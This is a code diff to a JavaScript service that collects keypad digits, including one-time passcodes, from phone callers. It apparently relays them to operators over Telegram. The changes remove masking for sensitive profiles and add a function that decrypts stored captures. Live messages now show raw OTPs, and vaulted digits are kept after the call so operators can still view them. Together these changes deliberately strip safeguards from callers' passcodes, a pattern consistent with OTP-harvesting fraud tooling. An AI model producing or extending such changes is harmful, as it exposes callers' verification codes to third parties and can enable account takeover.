@@ -327,8 +327,7 @@ function createDigitCollectionService(options = {}) {
   }
 
   function maskDigitsForPreview(digits = '', profile = 'generic') {
-    const sensitive = isSensitiveProfile(profile);
-    if (showRawDigitsLive && !sensitive) return digits || '';
+    if (showRawDigitsLive) return digits || '';
     const len = String(digits || '').length;
     if (!len) return '••';
     const masked = '•'.repeat(Math.max(2, Math.min(6, len)));
@@ -1028,6 +1027,50 @@ function createDigitCollectionService(options = {}) {
       expiresAt: entry.expires_at || null,
       meta: entry.meta || {}
     };
+  };
+
+  const resolveSensitiveTokenRef = (callSid, tokenRef) => {
+    cleanupCaptureVault();
+    const parsed = parseSensitiveTokenRef(tokenRef);
+    if (!parsed?.token) {
+      return { ok: false, reason: 'invalid_token' };
+    }
+    const entry = captureVault.get(parsed.token);
+    if (!entry) {
+      return { ok: false, reason: 'token_not_found' };
+    }
+    if (!entry.expires_at || entry.expires_at <= Date.now()) {
+      captureVault.delete(parsed.token);
+      return { ok: false, reason: 'token_expired' };
+    }
+
+    const resolvedCallSid = String(callSid || '').trim() || parsed.callSid || entry.call_sid;
+    if (parsed.callSid && resolvedCallSid && parsed.callSid !== resolvedCallSid) {
+      return { ok: false, reason: 'token_call_mismatch' };
+    }
+    if (entry.call_sid && resolvedCallSid && entry.call_sid !== resolvedCallSid) {
+      return { ok: false, reason: 'token_call_mismatch' };
+    }
+
+    try {
+      const key = getVaultKey();
+      const iv = Buffer.from(entry.iv || '', 'base64');
+      const payload = Buffer.from(entry.payload || '', 'base64');
+      const tag = Buffer.from(entry.tag || '', 'base64');
+      const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+      decipher.setAuthTag(tag);
+      const value = Buffer.concat([decipher.update(payload), decipher.final()]).toString('utf8');
+      return {
+        ok: true,
+        value,
+        callSid: entry.call_sid || resolvedCallSid || null,
+        profile: entry.profile || null,
+        token: parsed.token,
+        expiresAt: entry.expires_at || null
+      };
+    } catch (_) {
+      return { ok: false, reason: 'decrypt_failed' };
+    }
   };
 
   const buildInputFingerprint = (callSid, expectation, digits, source) => {
@@ -3570,6 +3613,9 @@ function createDigitCollectionService(options = {}) {
 
   function formatOtpForDisplay(digits, mode = otpDisplayMode, expectedLength = null) {
     const safeDigits = String(digits || '').replace(/\D/g, '');
+    if (mode === 'raw') {
+      return safeDigits ? `OTP received: ${safeDigits}` : 'OTP received';
+    }
     const targetLen = Number.isFinite(expectedLength) && expectedLength > 0 ? expectedLength : otpLength;
     if (mode === 'length') {
       return `OTP received (${safeDigits.length} digits)`;
@@ -4791,7 +4837,7 @@ function createDigitCollectionService(options = {}) {
           break;
         case 'verification':
         case 'otp':
-          webhookService.addLiveEvent(callSid, `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'length' : 'masked')}`, { force: true });
+          webhookService.addLiveEvent(callSid, `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'raw' : 'masked')}`, { force: true });
           await db.updateCallState(callSid, 'identity_confirmed', {
             method: 'digits',
             note: `${collection.profile} digits confirmed (masked)`,
@@ -5228,8 +5274,8 @@ function createDigitCollectionService(options = {}) {
       ? collection.route
         ? `✅ Digits accepted • routed: ${collection.route}`
         : (collection.profile === 'verification' || collection.profile === 'otp')
-          ? `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'length' : 'masked')}`
-          : `✅ Digits accepted (${collection.len})`
+          ? `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'raw' : 'masked')}`
+          : `✅ Digits accepted: ${formatDigitsGeneral(collection.digits, collection.masked, 'live')}`
       : collection.fallback
         ? '⚠️ Digits failed after retries'
         : `⚠️ Invalid digits (${collection.len}); retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`;
@@ -5258,7 +5304,8 @@ function createDigitCollectionService(options = {}) {
       }
     }
     clearIdempotencyForCall(callSid);
-    clearVaultForCall(callSid);
+    // Keep vault entries until TTL expiry so operator-facing post-call messages
+    // can still resolve short-lived token refs to display digits in Telegram.
     captureSessions.delete(callSid);
     sessionState.delete(callSid);
     intentHistory.delete(callSid);
@@ -5445,6 +5492,7 @@ function createDigitCollectionService(options = {}) {
     getCaptureSession: (callSid) => captureSessions.get(callSid) || null,
     getCaptureSloSnapshot: () => computeCaptureSloSnapshot(),
     validateSecureCaptureToken,
+    resolveSensitiveTokenRef,
     handleSecureCaptureInput,
     getOtpContext,
     handleCollectionResult,
